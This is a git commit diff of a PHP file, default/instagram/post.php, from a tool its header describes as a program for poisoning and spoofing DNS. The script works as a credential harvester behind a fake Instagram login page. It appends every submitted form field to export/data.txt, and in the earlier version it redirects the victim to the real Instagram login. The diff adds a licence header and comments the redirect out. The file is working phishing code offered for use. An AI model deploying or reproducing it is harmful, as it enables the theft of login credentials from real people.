2dd3323f760f872ca6e2e4432f91469165d20549
mak <makindosx@gmail.com>
2019-11-10 18:37:52 +0200

    Add files via upload

--- default/instagram/post.php
+++ default/instagram/post.php
@@ -1,7 +1,27 @@
-<?php
+<?php 
+
+/*
+*  Copyright (c) 2019 Barchampas Gerasimos <makindosx@gmail.com>.
+*  proxior is a program for poisoning and spoofing dns.
+*
+*  proxior is free software: you can redistribute it and/or modify
+*  it under the terms of the GNU Affero General Public License as published by
+*  the Free Software Foundation, either version 3 of the License, or
+*  (at your option) any later version.
+*
+*  proxior is distributed in the hope that it will be useful,
+*  but WITHOUT ANY WARRANTY; without even the implied warranty of
+*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+*  GNU Affero General Public License for more details.
+*
+*  You should have received a copy of the GNU Affero General Public License
+*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
+*
+*/
 
 $file = "export/data.txt";
 file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 
 ?>
-<meta http-equiv="refresh" content="0; url=https://www.instagram.com/accounts/login/?source=auth_switcher"/>
+
+<!-- <meta http-equiv="refresh" content="0; url=https://www.instagram.com/accounts/login/?hl=en"/> -->
